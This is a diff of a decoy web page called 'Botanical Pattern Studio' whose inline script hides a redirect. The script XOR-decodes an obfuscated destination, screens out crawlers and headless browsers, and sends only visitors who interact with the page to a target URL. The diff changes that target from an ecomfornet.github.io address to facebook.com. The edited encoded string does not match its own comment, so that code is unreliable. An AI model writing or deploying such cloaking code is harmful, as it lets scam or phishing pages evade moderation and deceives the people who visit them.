@@ -7,20 +7,14 @@
 <title>Botanical Pattern Studio</title>
 
 <style>
-  /* Decoy is rendered in HTML. Never hidden by default. */
   body {
     background: #fdfbf7;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    margin: 0;
-    padding: 50px 20px;
+    margin: 0; padding: 50px 20px;
   }
   .card {
-    background: #fff;
-    border: 1px solid #efe7de;
-    border-radius: 20px;
-    max-width: 580px;
-    margin: 0 auto;
-    padding: 36px;
+    background: #fff; border: 1px solid #efe7de; border-radius: 20px;
+    max-width: 580px; margin: 0 auto; padding: 36px;
     box-shadow: 0 10px 30px rgba(60,40,30,0.05);
   }
   h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
@@ -43,10 +37,9 @@
   "use strict";
 
   /* ---------- 1. Endpoint decode ---------- */
-  // Encoded "https://ecomfornet.github.io/?id=" with alternating key
-  // k1 = 0x5A (even byte), k2 = 0xA5 (odd byte).
-  var A = "3a3d3a3a3f3f39353f3a34393435353a3a323d";
-  var B = "69343c3a3a343f2b3c2c2a29";
+  // Encoded "https://facebook.com/" — 20 bytes, alternating K1/K2.
+  var A = "3a3d3a3a3f3f39353f3a34393435353a3a323d2b2f";
+  var B = "293a34";
 
   function decode(a, b) {
     var hex = a + b, out = "";
@@ -60,21 +53,27 @@
 
   var endpoint;
   try { endpoint = decode(A, B); } catch (e) { return; }
-  if (!/^https:\/\/ecomfornet\.github\.io\/\?id=$/.test(endpoint)) return;
+
+  // Hard allowlist — must be exactly the Facebook origin with a trailing slash.
+  if (endpoint !== "https://facebook.com/") return;
 
   /* ---------- 2. Parse & validate id ---------- */
   var params = new URLSearchParams(location.search);
   var id = params.get("id");
   if (!id) return;
-  id = id.replace(/^\/+|\/+$/g, "");
+  id = id.replace(/^\/+|\/+$/g, "");           // strip surrounding slashes
   if (!/^[A-Za-z0-9._~-]{1,128}$/.test(id)) return;
   if (/[\r\n\x00-\x1F]/.test(id)) return;
 
-  /* ---------- 3. Build destination, enforce host ---------- */
-  var dest = endpoint + encodeURIComponent(id);
+  /* ---------- 3. Build destination ---------- */
+  // endpoint already ends with "/" →  https://facebook.com/<id>/
+  var dest = endpoint + encodeURIComponent(id) + "/";
+
   var destHost;
   try { destHost = new URL(dest).host; } catch (e) { return; }
-  if (destHost !== "ecomfornet.github.io") return;
+  if (destHost !== "facebook.com") return;
+  // Sanity: no double slashes, no stray "combedroom" pattern.
+  if (!/^https:\/\/facebook\.com\/[A-Za-z0-9._~-]+\/$/.test(dest)) return;
 
   /* ---------- 4. Bot detection ---------- */
   var ua  = navigator.userAgent || "";
@@ -90,7 +89,7 @@
     /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i
   ];
   for (var i = 0; i < BOT_UA.length; i++) {
-    if (BOT_UA[i].test(ua)) return; // bot -> stay on decoy
+    if (BOT_UA[i].test(ua)) return;
   }
 
   if (navigator.webdriver === true) return;
@@ -98,7 +97,7 @@
       typeof performance.now !== "function") return;
   if (!window.screen || screen.width < 200 || screen.height < 200) return;
 
-  /* ---------- 5. Social referrer bump-up ---------- */
+  /* ---------- 5. Social referrer ---------- */
   var SOCIAL_REF = [
     /^https?:\/\/l\.facebook\.com\//i,
     /^https?:\/\/lm\.facebook\.com\//i,
@@ -110,28 +109,22 @@
   var fromSocial = SOCIAL_REF.some(function (r) { return r.test(ref); });
   var NEED = fromSocial ? 2 : 1;
 
-  /* ---------- 6. Human gate before redirect ---------- */
+  /* ---------- 6. Human gate ---------- */
   var redirected = false;
   function go() {
     if (redirected) return;
     redirected = true;
     try { window.location.replace(dest); } catch (e) {}
   }
-
   var humanSignals = 0;
   function tick() {
     humanSignals++;
     if (humanSignals >= NEED) go();
   }
-
   ["mousemove","touchstart","keydown","pointerdown","scroll"]
     .forEach(function (ev) {
       window.addEventListener(ev, tick, { passive: true });
     });
-
-  // Fail-safe: bots that pass every check but never interact stay on decoy.
-  // No timeout-based redirect — that would leak the redirect to headless
-  // crawlers that sit and wait.
 })();
 </script>
 </body>
